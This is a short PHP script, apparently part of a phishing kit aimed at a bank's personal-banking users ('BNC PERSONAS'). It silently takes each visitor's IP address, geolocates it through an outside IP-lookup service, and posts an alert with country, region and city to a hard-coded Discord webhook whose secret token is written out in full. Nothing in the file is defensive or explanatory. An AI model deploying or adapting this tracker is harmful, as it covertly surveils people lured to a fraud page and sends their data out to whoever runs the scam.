<?php
function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipList = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        $ip = trim($ipList[0]);
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}

$webhookUrl = "https://discord.com/api/webhooks/1359316935682297886/_U0RICZb0WDAfGDYDYrfJUOvUVis-pV80eP2owktMuIUq7yOiKlm8BjmdJrf5R9nsa5v";

$ip = getUserIP();

$detalle_ip = file_get_contents("http://ip-api.com/json/$ip");
$detalle_ip = json_decode($detalle_ip, true);

$ubicacion = "";
if($detalle_ip && $detalle_ip['status'] == 'success'){
    $ubicacion .= "🌎 **País:** " . $detalle_ip['country'] . "\n";
    $ubicacion .= "🗺 **Región:** " . $detalle_ip['regionName'] . "\n";
    $ubicacion .= "🏙 **Ciudad:** " . $detalle_ip['city'] . "\n";
}

$uniqueId = strtoupper(substr(md5($ip), 0, 4));

$mensaje = "**🚨 USUARIO DETECTADO (BNC PERSONAS) 🚨**\n\n";
$mensaje .= "📌 **IP:** `$ip`\n";
$mensaje .= $ubicacion;
$mensaje .= "\n#️⃣ **ID de Usuario:** `#$uniqueId`";

$data = [
    "content" => $mensaje
];

$options = [
    'http' => [
        'header'  => "Content-Type: application/json\r\n",
        'method'  => 'POST',
        'content' => json_encode($data),
    ],
];
$context = stream_context_create($options);
file_get_contents($webhookUrl, false, $context);
?>
